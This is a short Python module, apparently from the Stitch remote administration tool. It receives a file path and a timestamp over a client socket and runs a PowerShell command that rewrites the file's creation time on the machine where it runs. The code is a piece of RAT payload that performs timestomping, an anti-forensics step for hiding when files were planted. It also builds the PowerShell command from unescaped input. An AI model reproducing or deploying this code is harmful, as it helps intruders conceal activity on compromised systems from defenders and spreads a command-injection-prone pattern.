# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import subprocess

editfile = receive(client_socket)
edittime = receive(client_socket)
if os.path.exists(editfile):
    cmd ='powershell "Get-ChildItem \'%s\' | %% { $_.CreationTime = \'%s\' }"' % (editfile,edittime)
    resp = run_command(cmd)
else:
    resp = f"[!] {editfile}: No such file or directory\n"
send(client_socket,resp)
